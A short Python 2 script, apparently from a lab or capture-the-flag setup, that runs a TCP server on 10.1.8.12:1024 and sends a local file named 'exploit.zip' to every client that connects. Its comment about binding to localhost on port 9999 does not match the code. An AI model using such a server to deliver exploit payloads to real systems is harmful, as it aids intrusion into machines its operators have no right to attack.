#!/usr/bin/env python

import subprocess
import SocketServer

class MyTCPHandler(SocketServer.BaseRequestHandler):
   def handle(self):
    exploit = "./exploit.zip"
    f = open(exploit, "rb")
    self.request.send(f.read())
    f.close()

if __name__ == "__main__":
    HOST, PORT = "10.1.8.12", 1024

    # Create the server, binding to localhost on port 9999
    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)

    # Activate the server; this will keep running until you
    # interrupt the program with Ctrl-C
    server.serve_forever()
